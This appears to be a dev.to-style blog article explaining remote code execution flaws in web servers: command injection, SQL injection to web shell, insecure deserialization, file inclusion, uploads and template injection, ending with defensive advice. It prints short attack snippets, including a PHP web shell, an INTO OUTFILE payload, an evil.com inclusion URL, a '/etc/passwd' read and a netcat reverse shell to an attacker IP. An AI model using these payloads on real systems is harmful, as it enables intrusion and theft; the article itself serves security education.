## **Introduction**

Imagine a stranger being able to sit behind your computer screen without your permission. That’s the terrifying reality of Remote Code Execution (RCE) vulnerabilities. In recent years, critical infrastructures, including top-tier enterprises and government systems, have fallen victim to silent yet devastating RCE attacks. In January 2024 alone, over 2,000 Ivanti VPN devices were compromised—despite factory resets.

This article dives deep into the world of RCE targeting web servers. You'll learn how attackers exploit these vulnerabilities, how real organizations have suffered, and how to protect against them. With attacks becoming more sophisticated and widespread, understanding RCE is no longer optional—it’s essential.

**Thesis**: This blog explores RCE vulnerabilities on web servers, offering technical insight, real-world examples, and actionable defense strategies for tech enthusiasts and professionals.

## **What Is Remote Code Execution (RCE)?**

Remote Code Execution (RCE) is a security vulnerability that allows attackers to run arbitrary code on a remote server. If exploited, it can lead to:

* Full system compromise
    
* Data breaches
    
* Malware installation
    
* Persistent backdoors
    

RCE bypasses regular access controls and security mechanisms, offering an attacker administrative-level control remotely.

## **Common RCE Vulnerability Types in Web Servers**

[![Common RCE Vulnerability Types in Web Servers](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fse2i2fx2wp6nax6x2tau.png align="left")](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fse2i2fx2wp6nax6x2tau.png)

## **Injection Vulnerabilities:**

### **Command Injection**

Attackers exploit poor input validation to inject system-level commands. For instance:

```plaintext
<?php $cmd = $_GET['cmd']; system($cmd); ?>
```

A URL like [`example.com/vuln.php?cmd=whoami`](http://example.com/vuln.php?cmd=whoami) lets an attacker run commands directly on the server.

**Other affected platforms:** Node.js (via `child_process.exec()`), Python’s `os.system()`.

### **SQL Injection to RCE**

While SQL injection typically targets databases, it can morph into RCE. Example:

```plaintext
' UNION SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/shell.php'
```

This creates a web shell, granting attackers full command execution.

### **LDAP Injection**

Less common but equally deadly. Malformed LDAP queries can expose authentication flows or be chained with other flaws to achieve RCE.

## **Insecure Deserialization: The Hidden Backdoor**

[![Insecure Deserialization](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fidzeqbgtlzb7wdksxgg8.png align="left")](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fidzeqbgtlzb7wdksxgg8.png)

When apps deserialize user input without verification, they open the door to arbitrary object injection and code execution.

### **Example in Python Flask:**

```plaintext
user = pickle.loads(base64.b64decode(request.form['payload']))
```

A crafted payload can execute commands when the server processes it.

**Mitigation Tip:** Avoid native serialization like `pickle` or Java’s `ObjectInputStream`. Use safe formats like JSON.

## **File Inclusion Vulnerabilities (LFI & RFI)**

[![File Inclusion Vulnerabilities](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fi8t8lg9q3yny4zchgjqq.png align="left")](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fi8t8lg9q3yny4zchgjqq.png)

When applications dynamically include files based on user input:

```plaintext
<?php include($_GET['page'].".php"); ?>
```

Attackers can exploit this for **Local File Inclusion** (`../../etc/passwd`) or **Remote File Inclusion** ([`http://evil.com/shell.txt`](http://evil.com/shell.txt)).

---

## **File Upload Vulnerabilities**

Unvalidated file uploads allow attackers to deploy malicious scripts:

```plaintext
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/".$_FILES['file']['name']);
```

If `shell.php` is uploaded, it can be triggered with:  
  
[`example.com/uploads/shell.php?cmd=ls`](http://example.com/uploads/shell.php?cmd=ls)

---

## **Buffer Overflow: Old But Gold**

Often seen in native-code applications, buffer overflows let attackers overwrite memory—including return addresses—to hijack control flow and run injected shellcode.

Though rare in high-level web frameworks, these remain relevant in **embedded web servers**, **C/C++ backends**, or **IoT admin panels**.

---

## **Server-Side Template Injection (SSTI)**

[![Server-Side Template Injection](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Ftnlkymfi01v5lpouobbh.png align="left")](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Ftnlkymfi01v5lpouobbh.png)

Popular in Python’s Jinja2 or Ruby’s ERB, SSTI occurs when user input is embedded in templates without sanitization:

```plaintext
template = Template(user_input)
```

An attacker can inject `{{config.items()}}` or worse, `{{().__class__.__bases__[0].__subclasses__()}}`.

### **1\. Reconnaissance**

* Tools: Nmap, Shodan
    
* Targets: Service versions, open ports, directory structure
    

### **2\. Exploitation Techniques**

* **Command Injection (PHP)**:
    
    ```plaintext
    <?php $cmd = $_GET['cmd']; system($cmd); ?>
    // Exploited with: ?cmd=whoami
    ```
    
* **Command Injection (Node.js)**:
    
    ```plaintext
    const { exec } = require('child_process');
    exec(`ls -l ${userInput}`, ...);
    // ?input=; cat /etc/passwd
    ```
    
* **SQL Injection Leading to RCE**:
    
    ```plaintext
    <?php
    $query = "SELECT * FROM users WHERE username = '". $_GET['username']. "'";
    // Payload: ' UNION SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE ...
    ?>
    ```
    
* **Insecure Deserialization (Python + Pickle)**:
    
    ```plaintext
    import pickle
    user = pickle.loads(base64.b64decode(request.form['payload']))
    ```
    
* **File Upload**:
    
    ```plaintext
    <?php move_uploaded_file($_FILES['file']['tmp_name'], "uploads/". $_FILES['file']['name']); ?>
    // Upload: shell.php with system($_GET['cmd'])
    ```
    

### **3\. Payload Delivery**

* Reverse Shell Example (Linux):
    
    ```plaintext
    nc <attacker_ip> <port> -e /bin/bash
    ```
    

### **4\. Post-Exploitation**

* Add users, install persistence tools, lateral movement
    
* Possible outcomes: cryptojacking, ransomware, data theft
    

---

### **Impact of Successful RCE Attacks**

* **Data Breaches**: PII, database access, config leaks
    
* **Full Server Control**: Install malware, backdoors, new users
    
* **Ransomware Deployment**: Encrypt files, demand payment
    
* **Cryptojacking**: Hidden crypto mining using server resources
    
* **Denial of Service**: Weaponize server for wider attacks
    
* **Reputation Damage**: Lost trust, legal fines, massive downtime

## **Conclusion**

From command injection to unsafe file uploads, the most common RCE vulnerabilities arise from predictable, often preventable flaws in application logic and security hygiene.

### **Key Takeaways:**

* **Validate all input**, always.
    
* **Avoid unsafe functions** like `eval()`, `system()`, `pickle.loads()`.
    
* **Patch regularly**—even low-profile services can be targets.
    
* **Test with offensive tools** like fuzzers, static analyzers, and red team exercises.
    

We started with a scary scenario—and it’s real. But with the right knowledge, you can *turn the tables* on attackers.

> Don’t just *hope* your app is secure. **Prove it**—test it, patch it, and break it before someone else does.
